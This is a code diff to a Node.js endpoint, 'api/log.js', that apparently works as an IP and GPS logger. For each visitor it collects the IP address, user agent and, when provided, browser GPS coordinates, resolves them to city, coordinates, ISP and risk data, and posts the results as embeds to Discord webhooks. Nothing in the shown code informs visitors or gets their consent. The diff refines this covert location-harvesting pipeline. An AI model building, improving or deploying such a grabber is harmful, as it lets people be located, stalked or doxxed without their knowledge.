@@ -1,4 +1,4 @@
-// api/log.js - Updated with Discord webhook support
+// api/log.js - Fixed user agent handling
 
 const fetch = require('node-fetch');
 
@@ -25,33 +25,46 @@ export default async function handler(req, res) {
       return res.status(500).json({ error: 'API key not configured' });
     }
     
-    const { gpsCoordinates, userAgent } = req.body;
-    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
+    const { gpsCoordinates } = req.body;
+    
+    // Get client IP (use X-Forwarded-For if behind proxy)
+    const clientIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                     req.headers['x-real-ip'] || 
                     req.connection.remoteAddress;
     
-    console.log(`Processing request from IP: ${clientIP}`);
+    // Get user agent from headers (if from browser) or from request body
+    const userAgent = req.body.userAgent || req.headers['user-agent'] || 'Unknown';
     
-    // Always get IP geolocation
+    console.log(`Processing request - IP: ${clientIP}, User Agent: ${userAgent.substring(0, 100)}...`);
+    
+    // Get all data in parallel
     const [ipGeoData, userAgentData, riskData] = await Promise.all([
+      // IP Geolocation
       fetch(`https://api-bdc.net/data/ip-geolocation-full?key=${API_KEY}&ip=${clientIP}`).then(r => r.json()),
-      fetch(`https://api-bdc.net/data/user-agent-info?key=${API_KEY}&userAgent=${encodeURIComponent(userAgent || navigator.userAgent)}`).then(r => r.json()),
+      
+      // User Agent Info - CORRECTED URL
+      fetch(`https://api-bdc.net/data/user-agent-info?key=${API_KEY}&userAgentRaw=${encodeURIComponent(userAgent)}`).then(r => r.json()),
+      
+      // Risk Data
       fetch(`https://api-bdc.net/data/user-risk?key=${API_KEY}`).then(r => r.json())
     ]);
     
+    // Log the user agent data for debugging
+    console.log('User Agent API Response:', JSON.stringify(userAgentData, null, 2));
+    
     // Prepare IP data for Discord
-    const ipEmbed = createIPEmbed(ipGeoData, userAgentData, riskData, clientIP);
+    const ipEmbed = createIPEmbed(ipGeoData, userAgentData, riskData, clientIP, userAgent);
     
     // Send IP webhook to Discord
+    let ipWebhookResult = { sent: false, error: null };
     if (IP_DISCORD_WEBHOOK && !IP_DISCORD_WEBHOOK.includes('YOUR_')) {
-      await sendDiscordWebhook(IP_DISCORD_WEBHOOK, {
+      ipWebhookResult = await sendDiscordWebhook(IP_DISCORD_WEBHOOK, {
         embeds: [ipEmbed]
       });
-    } else {
-      console.log('IP Discord webhook URL not configured');
     }
     
     let gpsResponse = null;
+    let gpsWebhookResult = { sent: false, error: null };
     
     // If GPS coordinates provided
     if (gpsCoordinates && gpsCoordinates.latitude && gpsCoordinates.longitude) {
@@ -60,15 +73,13 @@ export default async function handler(req, res) {
       ).then(r => r.json());
       
       // Prepare GPS data for Discord
-      const gpsEmbed = createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP);
+      const gpsEmbed = createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP, userAgent);
       
       // Send GPS webhook to Discord
       if (GPS_DISCORD_WEBHOOK && !GPS_DISCORD_WEBHOOK.includes('YOUR_')) {
-        await sendDiscordWebhook(GPS_DISCORD_WEBHOOK, {
+        gpsWebhookResult = await sendDiscordWebhook(GPS_DISCORD_WEBHOOK, {
           embeds: [gpsEmbed]
         });
-      } else {
-        console.log('GPS Discord webhook URL not configured');
       }
       
       gpsResponse = {
@@ -80,7 +91,11 @@ export default async function handler(req, res) {
     res.status(200).json({
       success: true,
       message: 'Data processed successfully',
-      ipData: prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP),
+      webhooks: {
+        ip: ipWebhookResult,
+        gps: gpsWebhookResult
+      },
+      ipData: prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP, userAgent),
       gpsData: gpsResponse?.gpsData || null
     });
     
@@ -88,7 +103,8 @@ export default async function handler(req, res) {
     console.error('Server error:', error);
     res.status(500).json({ 
       error: 'Internal server error',
-      message: error.message 
+      message: error.message,
+      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
     });
   }
 }
@@ -103,20 +119,21 @@ async function sendDiscordWebhook(webhookUrl, data) {
     });
     
     if (!response.ok) {
-      console.error(`Discord webhook failed: ${response.status} ${response.statusText}`);
-      return false;
+      const errorText = await response.text();
+      console.error(`Discord webhook failed: ${response.status} ${response.statusText}`, errorText);
+      return { sent: false, error: `HTTP ${response.status}: ${errorText.substring(0, 100)}` };
     }
     
     console.log('Discord webhook sent successfully');
-    return true;
+    return { sent: true };
   } catch (error) {
     console.error('Discord webhook error:', error);
-    return false;
+    return { sent: false, error: error.message };
   }
 }
 
 // Create Discord embed for IP data
-function createIPEmbed(ipGeoData, userAgentData, riskData, clientIP) {
+function createIPEmbed(ipGeoData, userAgentData, riskData, clientIP, rawUserAgent) {
   const location = ipGeoData.location || {};
   const country = ipGeoData.country || {};
   const network = ipGeoData.network || {};
@@ -141,6 +158,19 @@ function createIPEmbed(ipGeoData, userAgentData, riskData, clientIP) {
                    riskData.risk === 'Medium' ? 0xFFA500 : 
                    0x00FF00;
   
+  // Truncate raw user agent if too long for Discord
+  const truncatedRawUA = rawUserAgent.length > 500 
+    ? rawUserAgent.substring(0, 497) + '...' 
+    : rawUserAgent;
+  
+  // Prepare user agent info from API response
+  const uaDevice = userAgentData.device || 'Unknown';
+  const uaOS = userAgentData.os || 'Unknown';
+  const uaParsed = userAgentData.userAgent || 'Unknown';
+  const uaIsMobile = userAgentData.isMobile ? '✅ Yes' : '❌ No';
+  const uaIsBot = userAgentData.isSpider ? '✅ Yes' : '❌ No';
+  const uaFamily = userAgentData.family || 'Unknown';
+  
   return {
     title: '🌐 IP Geolocation Data',
     description: `Data collected for ${clientIP}`,
@@ -154,7 +184,8 @@ function createIPEmbed(ipGeoData, userAgentData, riskData, clientIP) {
 **City:** ${location.city || location.localityName || 'N/A'}
 **Coordinates:** ${coords}
 **Timezone:** ${location.timeZone?.ianaTimeId || 'N/A'}
-**Local Time:** ${location.timeZone?.localTime || 'N/A'}`,
+**Local Time:** ${location.timeZone?.localTime || 'N/A'}
+**Confidence:** ${ipGeoData.confidence || 'N/A'}`,
         inline: true
       },
       {
@@ -163,8 +194,8 @@ function createIPEmbed(ipGeoData, userAgentData, riskData, clientIP) {
 **ASN:** ${primaryCarrier.asn || 'N/A'}
 **Organization:** ${primaryCarrier.organisation || 'N/A'}
 **Carrier:** ${network.organisation || 'N/A'}
-**Confidence:** ${ipGeoData.confidence || 'N/A'}
-**Registry:** ${network.registry || 'N/A'}`,
+**Registry:** ${network.registry || 'N/A'}
+**Bogon:** ${hazard.isBogon ? '✅ Yes' : '❌ No'}`,
         inline: true
       },
       {
@@ -179,13 +210,19 @@ function createIPEmbed(ipGeoData, userAgentData, riskData, clientIP) {
         inline: true
       },
       {
-        name: '👤 User Info',
-        value: `**Risk Level:** ${riskData.risk || 'N/A'}
-**Device:** ${userAgentData.device || 'N/A'}
-**OS:** ${userAgentData.os || 'N/A'}
-**User Agent:** ${userAgentData.userAgent?.substring(0, 50)}${userAgentData.userAgent?.length > 50 ? '...' : ''}
-**Mobile:** ${userAgentData.isMobile ? '✅ Yes' : '❌ No'}
-**Bot:** ${userAgentData.isSpider ? '✅ Yes' : '❌ No'}`,
+        name: '👤 User Agent - Raw',
+        value: `\`\`\`${truncatedRawUA}\`\`\``,
+        inline: false
+      },
+      {
+        name: '📱 User Agent - Parsed',
+        value: `**Device:** ${uaDevice}
+**OS:** ${uaOS}
+**Browser/Family:** ${uaFamily} ${userAgentData.versionMajor ? `v${userAgentData.versionMajor}` : ''}${userAgentData.versionMinor ? `.${userAgentData.versionMinor}` : ''}
+**Parsed UA:** ${uaParsed}
+**Mobile:** ${uaIsMobile}
+**Bot:** ${uaIsBot}
+**Risk Level:** ${riskData.risk || 'N/A'}`,
         inline: false
       }
     ],
@@ -196,8 +233,13 @@ function createIPEmbed(ipGeoData, userAgentData, riskData, clientIP) {
 }
 
 // Create Discord embed for GPS data
-function createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP) {
+function createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP, rawUserAgent) {
   const timeZone = reverseGeoData.timeZone || {};
+  
+  // Truncate raw user agent
+  const truncatedRawUA = rawUserAgent.length > 300 
+    ? rawUserAgent.substring(0, 297) + '...' 
+    : rawUserAgent;
   
   return {
     title: '📍 GPS Location Data',
@@ -208,7 +250,7 @@ function createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP) {
       {
         name: '🎯 Precise Location',
         value: `**Coordinates:** ${gpsCoordinates.latitude.toFixed(6)}, ${gpsCoordinates.longitude.toFixed(6)}
-**Accuracy:** Direct GPS`,
+**Accuracy:** ${gpsCoordinates.accuracy ? `${Math.round(gpsCoordinates.accuracy)}m` : 'Direct GPS'}`,
         inline: false
       },
       {
@@ -230,11 +272,8 @@ function createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP) {
         inline: true
       },
       {
-        name: '📊 Additional Info',
-        value: `**Source:** Browser GPS Permission
-**Plus Code:** ${reverseGeoData.plusCode || 'N/A'}
-**Continent Code:** ${reverseGeoData.continentCode || 'N/A'}
-**Country Code:** ${reverseGeoData.countryCode || 'N/A'}`,
+        name: '👤 User Agent',
+        value: `\`\`\`${truncatedRawUA}\`\`\``,
         inline: false
       }
     ],
@@ -244,8 +283,8 @@ function createGPSEmbed(reverseGeoData, gpsCoordinates, clientIP) {
   };
 }
 
-// Original data preparation functions (kept for compatibility)
-function prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP) {
+// Original data preparation functions
+function prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP, rawUserAgent) {
   const location = ipGeoData.location || {};
   const country = ipGeoData.country || {};
   const network = ipGeoData.network || {};
@@ -276,9 +315,11 @@ function prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP) {
     'Hosting ASN (isHostingAsn)': hazard.isHostingAsn ? 'Yes' : 'No',
     'Cellular Network (isCellular)': hazard.isCellular ? 'Yes' : 'No',
     'Risk (risk)': riskData.risk || 'N/A',
-    'User Agent (from the browser)': userAgentData.userAgent || 'N/A',
+    'User Agent Raw': rawUserAgent || 'N/A',
     'Device (device)': userAgentData.device || 'N/A',
     'OS (os)': userAgentData.os || 'N/A',
+    'Browser Family': userAgentData.family || 'N/A',
+    'Browser Version': userAgentData.versionMajor ? `v${userAgentData.versionMajor}` : 'N/A',
     'Mobile (isMobile)': userAgentData.isMobile ? 'Yes' : 'No',
     'Bot (isSpider)': userAgentData.isSpider ? 'Yes' : 'No'
   };
@@ -305,4 +346,4 @@ function prepareGPSWebhookData(reverseGeoData, gpsCoordinates) {
     'GPS Accuracy': 'Direct GPS coordinates',
     'GPS Source': 'Browser geolocation API'
   };
-          }
+  }
